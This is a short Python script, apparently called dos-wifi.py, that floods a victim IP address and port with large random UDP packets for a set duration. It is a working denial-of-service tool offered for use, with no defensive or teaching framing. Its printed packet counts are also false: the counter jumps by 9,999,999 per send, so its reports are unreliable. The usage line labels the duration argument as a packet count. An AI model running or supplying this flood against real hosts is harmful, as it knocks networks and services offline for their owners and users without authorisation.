import time
import socket
import random
import sys


def usage():
    print("\033[1;91mUsage: python3 dos-wifi.py <ip> <port> <packet>")


def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(29009)
    timeout = time.time() + duration
    sent = 30000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 9999999
        print(f"\033[1;91mSended \033[1;32m{sent} "
              f"\033[1;91mPackets to host \033[1;32m{victim} "
              f"\033[1;91mTo Port \033[1;32m{vport}")


def main():
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))


if __name__ == '__main__':
    main()
